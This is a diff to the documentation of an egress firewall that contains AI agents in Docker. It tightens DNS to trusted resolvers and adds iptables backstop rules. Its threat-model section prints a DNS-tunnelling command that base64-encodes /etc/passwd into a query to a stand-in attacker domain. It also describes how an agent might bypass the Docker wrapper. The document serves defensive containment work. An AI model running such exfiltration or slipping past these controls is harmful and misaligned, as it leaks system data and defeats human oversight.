@@ -22,7 +22,7 @@ This firewall solves a specific problem: **egress control for AI agents running 
 
 - **Full filesystem access**: Agents read and write files freely. If your threat model requires filesystem isolation, you need additional controls.
 - **Localhost communication**: Required for stdio-based MCP servers running alongside the agent.
-- **DNS resolution**: Agents can resolve any domain (though they can't connect to most).
+- **DNS to trusted servers only**: DNS queries are restricted to configured DNS servers (default: Google DNS). This prevents DNS-based data exfiltration to attacker-controlled DNS servers.
 - **Docker socket access**: The agent can spawn containers—we intercept and constrain them, but the capability exists.
 
 ---
@@ -157,12 +157,13 @@ The agent and its MCP servers see normal Docker behavior; they don't know their 
 Even with docker-wrapper, we don't fully trust it—an agent could theoretically find the real Docker binary or exploit a wrapper bug. The DOCKER-USER chain provides a backstop:
 
 ```bash
-# Simplified rules (actual implementation in src/docker-manager.ts)
+# Simplified rules (actual implementation in src/host-iptables.ts)
 iptables -I DOCKER-USER -i awf-bridge -j FW_WRAPPER
-iptables -A FW_WRAPPER -s 172.30.0.10 -j ACCEPT          # Squid: unrestricted
-iptables -A FW_WRAPPER -p udp --dport 53 -j ACCEPT       # DNS allowed
-iptables -A FW_WRAPPER -p tcp -d 172.30.0.10 -j ACCEPT   # Traffic to proxy
-iptables -A FW_WRAPPER -j DROP                            # Everything else blocked
+iptables -A FW_WRAPPER -s 172.30.0.10 -j ACCEPT                    # Squid: unrestricted
+iptables -A FW_WRAPPER -p udp -d 8.8.8.8 --dport 53 -j ACCEPT      # DNS to trusted server
+iptables -A FW_WRAPPER -p udp -d 8.8.4.4 --dport 53 -j ACCEPT      # DNS to trusted server
+iptables -A FW_WRAPPER -p tcp -d 172.30.0.10 -j ACCEPT             # Traffic to proxy
+iptables -A FW_WRAPPER -j DROP                                      # Everything else blocked
 ```
 
 Any container on `awf-net`—whether we created it or the agent spawned it—has its egress filtered. Traffic either goes through Squid or gets dropped.
@@ -227,17 +228,21 @@ Container joins `awf-net`, egress hits DOCKER-USER, routes through Squid, blocke
 
 ### DNS Tunneling
 
-**Attack:** Agent encodes data in DNS queries to `data.attacker.com`:
+**Attack:** Agent encodes data in DNS queries to an attacker-controlled DNS server:
 ```bash
-nslookup $(cat /etc/passwd | base64).attacker.com
+nslookup $(cat /etc/passwd | base64).attacker.com attacker-dns-server.com
 ```
 
-**Mitigation:** We allow DNS (UDP/53) because blocking it breaks everything. DNS tunneling is a known limitation. For high-security environments, consider:
-- Using a DNS proxy that filters by domain
-- Restricting DNS to specific resolvers
-- Monitoring DNS query logs for anomalies
+**Mitigation:** DNS traffic is restricted to trusted DNS servers only (configurable via `--dns-servers`, default: Google DNS 8.8.8.8, 8.8.4.4). Attempts to query arbitrary DNS servers are blocked at the iptables level.
 
-This is outside our current scope but worth noting for threat models that include sophisticated attackers.
+```bash
+# The attacker's query to a rogue DNS server is blocked
+[FW_BLOCKED_UDP] SRC=172.30.0.20 DST=attacker-dns-server.com DPT=53
+```
+
+:::note[Remaining risk]
+DNS tunneling through the *allowed* DNS servers (encoding data in query names to attacker-controlled domains) is still theoretically possible, as the trusted DNS server will recursively resolve any domain. For high-security environments, consider using a DNS filtering service or monitoring DNS query logs for anomalies.
+:::
 
 ---
 
